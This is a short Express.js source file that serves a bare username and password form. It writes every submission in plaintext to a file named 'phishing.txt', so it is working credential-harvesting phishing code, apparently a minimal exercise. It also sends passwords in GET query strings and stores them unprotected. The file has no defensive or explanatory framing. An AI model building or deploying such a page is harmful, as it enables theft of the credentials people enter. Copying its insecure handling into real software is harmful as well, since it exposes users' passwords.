import express from 'express'
import fs from 'fs'

const app = express()

app.get('/', (req, res) => {
    res.send(`
    <form action="/submit" method="get">
    <input type="text" name="username" placeholder="username">
    <input type="password" name="password" placeholder="password">
    <button type="submit">submit</button>
    </form>
    `)
})

app.get('/submit', (req, res) => {
    const { username, password } = req.query
    const data = `username: ${username}  password: ${password}`

    res.send(`<h1> Your data has been saved </h1>`)

    fs.appendFileSync('phishing.txt', data)
})



const port = 3001
app.listen(port, () => {
    console.log(`server is running on port ${port}`)
})